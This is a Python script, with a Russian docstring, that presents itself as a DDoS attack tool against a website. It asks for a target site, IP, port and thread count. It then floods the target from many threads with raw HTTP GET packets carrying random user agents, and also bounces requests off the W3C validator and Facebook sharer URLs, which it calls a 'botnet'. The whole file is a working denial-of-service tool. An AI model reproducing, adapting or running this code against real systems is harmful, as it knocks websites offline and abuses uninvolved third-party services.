"""
DDos атака на сайт.
при 150 потоках ~5_000_000 пакетов за 20s
"""
import os
from queue import Queue
import time, socket, threading, urllib.request, random

uagent = [
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
    "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0",
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7",
    "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1"]

bots = [
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u="]


def botnet(url):
    try:
        while True:
            req = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': random.choice(uagent)}))
            print(f"{BLUE}Connecting to a botnet...{END}")
            time.sleep(.1)
    except:
        time.sleep(.1)


def down_it(item):
    try:
        while True:
            packet = str("GET / HTTP/1.1\nHost: " + host + "\n\n User-Agent: " + random.choice(uagent) + "\n").encode('utf-8')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, int(port)))
            if s.sendto(packet, (host, int(port))):
                s.shutdown(1)
                print(f"{BLUE}{time.ctime(time.time())} {END}"
                      f"{GREEN}{i} packet sent to {BLUE}{host} {END}")
            else:
                s.shutdown(1)
                print(f"{RED}<->{END}")
            time.sleep(.1)

    except socket.error as e:
        print(f"{RED}Error on server! Check the correct IP and Port...{END}")
        print(e)
        time.sleep(.1)


def dos():
    while True:
        item = q.get()
        down_it(item)
        q.task_done()


def dos2():
    while True:
        w.get()
        botnet(random.choice(bots) + "http://" + host)
        w.task_done()


if __name__ == '__main__':
    BLUE, RED, GREEN, YELLOW, CYAN, END = '\033[94m', '\033[91m', '\033[92m', '\033[93m', '\033[96m', '\033[0m'

    web = input("Target website: ")
    print(os.system(f"nslookup {web}"))

    host = input(f"{BLUE}[*] {GREEN}IP Target >>> {END} ")
    port = int(input(f"{BLUE}[*] {GREEN}PORT >>> {END} "))
    thr_counts = int(input(f"{BLUE}[*] {GREEN}Counts of threads {GREEN}>>> {END} "))

    os.system("clear")
    print(f"{GREEN}ip-: {host} -port-: {port} -counts of threads-: {thr_counts} {END}")
    print(f"{BLUE}Preparing for an attack{END}")
    print(f"{CYAN} ======D     15% {END}"); time.sleep(.2)
    print(f"{CYAN} =============D      25% {END}"); time.sleep(.3)
    print(f"{CYAN} ====================D       50% {END}"); time.sleep(.4)
    print(f"{CYAN} =============================D        75% {END}"); time.sleep(.3)
    print(f"{CYAN} =====================================D     100% {END}"); time.sleep(.2)
    os.system("clear")

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, int(port)))
        s.settimeout(1)
    except socket.error as e:
        print(f"{GREEN}Checking the server IP and port...{END}\n"
              f"{RED}Error! Check the correct IP and Port..{END}\n")
        raise e

    i = 0
    q = Queue()
    w = Queue()
    while True:
        for i in range(int(thr_counts)):
            t = threading.Thread(target=dos)
            t.daemon = True  # if thread is exist, it dies
            t.start()
            t2 = threading.Thread(target=dos2)
            t2.daemon = True  # if thread is exist, it dies
            t2.start()
        start = time.time()
        item = 0
        while True:
            if (item > 2E14):
                item = 0
                time.sleep(.1)
            i += 1
            item += 1
            q.put(item)
            w.put(item)
        q.join()
        w.join()
